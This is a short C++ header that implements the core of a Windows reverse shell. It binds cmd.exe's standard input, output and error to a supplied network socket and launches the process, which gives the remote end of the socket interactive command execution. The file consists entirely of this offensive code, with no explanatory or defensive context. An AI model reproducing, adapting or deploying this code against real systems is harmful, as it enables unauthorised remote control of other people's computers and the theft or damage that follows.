
#ifndef REVERSE_SHELL_LIB
#define REVERSE_SHELL_LIB

#include "windows.h"
#include "iostream"

class Reverseshell{
	
	public:
		HANDLE get( Socket * sock );
};

HANDLE Reverseshell::get( Socket * sock ){
	
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	HANDLE ret;
	
	ret = 0;
	
	if( !sock->valid( ) )
	return 0;;
	
	memset(&si,0, sizeof(si));
	memset(&pi,0, sizeof(pi));
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock->get();
	
	if( CreateProcess(
		NULL,
		(LPSTR)"cmd.exe",
		NULL,
		NULL,
		true,
		0,
		NULL,
		NULL,
		&si, &pi
	) ){
		ret = pi.hProcess;
		WaitForSingleObject( pi.hProcess, INFINITE );
		CloseHandle( pi.hProcess );
		CloseHandle( pi.hThread );
		
	}
	
return ret;
}

#endif
